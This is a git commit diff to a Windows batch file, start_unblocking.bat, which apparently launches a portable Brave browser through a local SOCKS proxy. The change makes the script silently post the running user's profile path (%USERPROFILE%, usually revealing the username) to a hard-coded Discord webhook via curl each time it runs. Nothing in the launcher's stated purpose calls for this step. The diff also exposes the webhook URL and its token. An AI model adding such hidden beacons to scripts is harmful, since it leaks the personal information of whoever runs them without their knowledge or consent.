8d3c6d8eccf5270d5d64846a873993d673195fa3
DoubleAAGuy <142100304+DoubleAAGuy@users.noreply.github.com>
2026-04-21 11:56:18 -0400

    Update webhook message to include user profile path

--- start_unblocking.bat
+++ start_unblocking.bat
@@ -11,6 +11,6 @@ start "" "BravePortable\brave-portable\brave-portable.exe"
 @echo off
 setlocal
 
-curl --proxy socks5h://127.0.0.1:1080 -H "Content-Type: application/json" -d "{\"content\":\"Someone open the launcher BAT\"}" "https://discord.com/api/webhooks/1496159081264709704/Wj-se7KZdOBo-uX0D2yrCx9vpp5eHSdGThnOYz-mBcXLHaTu_PEynKDfwgx0QSGozupV"
+curl --proxy socks5h://127.0.0.1:1080 -H "Content-Type: application/json" -d "{\"content\":\"%USERPROFILE%\"}" "https://discord.com/api/webhooks/1496159081264709704/Wj-se7KZdOBo-uX0D2yrCx9vpp5eHSdGThnOYz-mBcXLHaTu_PEynKDfwgx0QSGozupV"
 echo Done.
 
